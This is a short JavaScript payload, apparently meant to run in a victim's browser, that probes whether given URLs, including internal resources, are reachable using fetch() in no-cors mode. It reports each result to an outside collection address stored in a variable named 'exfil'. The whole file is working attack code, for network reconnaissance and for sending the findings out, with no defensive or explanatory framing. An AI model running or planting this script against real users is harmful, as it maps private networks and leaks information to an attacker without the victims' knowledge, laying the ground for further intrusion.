var exfil = 'https://<IP_ADDRESS>/?';

checkResource("https://google.com","google");
checkResource("https://bing.com","bing");
checkResource("https://bjaklsdjw2ue89au9u92u89aud8a","298uad89u89u3489a");

//checks for internal resources using the fetch() API. If a resource does not exist, an error will occur via fetch()
function checkResource(url,name){
  if (window.fetch) {
      fetch(url, {'mode':'no-cors'})
          .then(function () {
              fetch(exfil + "Internal Resource: [" + name +"] Detected!")
          })
          .catch(function () {
              fetch(exfil + "Internal Resource: [" + name + "] NOT Found!");
          });
  } else {
      fetch(exfil + "Invalid Browser FETCH() Detected");
  }
}
